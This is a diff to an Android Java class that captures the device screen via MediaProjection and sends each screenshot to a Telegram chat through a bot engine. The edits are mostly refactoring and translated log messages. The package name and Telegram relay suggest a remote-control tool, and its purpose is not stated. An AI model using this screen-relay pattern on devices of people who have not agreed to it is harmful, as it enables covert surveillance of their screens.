@@ -1,4 +1,4 @@
-package com.remotecontrol;
+ package com.remotecontrol;
 
 import android.content.Context;
 import android.content.Intent;
@@ -21,6 +21,7 @@ import java.nio.ByteBuffer;
 public class ScreenCapture {
 
     private static final String TAG = "ScreenCapture";
+
     private static MediaProjection activeProjection;
     private static VirtualDisplay virtualDisplay;
     private static ImageReader imageReader;
@@ -30,26 +31,26 @@ public class ScreenCapture {
         void onError(String message);
     }
 
-    // Метод для инициализации проекции (вызывается из сервиса)
+    // Тот самый метод, который требовал сервис
     public static void initProjection(MediaProjection projection, Context context) {
         activeProjection = projection;
-        Log.i(TAG, "MediaProjection инициализирована");
+        Log.i(TAG, "MediaProjection initialized");
     }
 
-    // Метод для очистки ресурсов (вызывается из сервиса)
+    // Метод очистки ресурсов для сервиса
     public static void release() {
-        releaseDisplay();
+        releaseDisplayResources();
         if (activeProjection != null) {
-            activeProjection.stop();
+            try { activeProjection.stop(); } catch (Exception ignored) {}
             activeProjection = null;
         }
-        Log.i(TAG, "ScreenCapture ресурсы освобождены");
+        Log.i(TAG, "ScreenCapture resources released");
     }
 
     public static void captureWithExistingProjection(Context context, long chatId, TelegramEngine engine) {
         if (activeProjection == null) {
-            Log.e(TAG, "Ошибка: проекция не активна");
-            if (engine != null) engine.sendMessage(chatId, "❌ Ошибка: нет доступа к экрану");
+            Log.e(TAG, "activeProjection is null");
+            if (engine != null) engine.sendMessage(chatId, "❌ Ошибка: проекция не активна");
             return;
         }
 
@@ -57,15 +58,15 @@ public class ScreenCapture {
             @Override
             public void onScreenshot(File file) {
                 if (engine != null) {
+                    // Используем 2 аргумента, как в TelegramEngine
                     engine.sendPhoto(chatId, file);
                 }
-                // Останавливаем сервис после скриншота, если это необходимо
                 context.stopService(new Intent(context, ScreenCaptureService.class));
             }
 
             @Override
             public void onError(String message) {
-                Log.e(TAG, "Ошибка скриншота: " + message);
+                Log.e(TAG, "Screenshot error: " + message);
                 if (engine != null) {
                     engine.sendMessage(chatId, "❌ Ошибка захвата: " + message);
                 }
@@ -106,7 +107,7 @@ public class ScreenCapture {
 
                     File file = new File(context.getCacheDir(), "sc_" + System.currentTimeMillis() + ".jpg");
                     try (FileOutputStream fos = new FileOutputStream(file)) {
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, fos);
+                        bitmap.compress(Bitmap.CompressFormat.JPEG, 75, fos);
                     }
                     callback.onScreenshot(file);
                 }
@@ -115,12 +116,12 @@ public class ScreenCapture {
             } finally {
                 if (image != null) image.close();
                 if (bitmap != null) bitmap.recycle();
-                releaseDisplay();
+                releaseDisplayResources();
             }
         }, null);
     }
 
-    private static void releaseDisplay() {
+    private static void releaseDisplayResources() {
         if (virtualDisplay != null) {
             virtualDisplay.release();
             virtualDisplay = null;
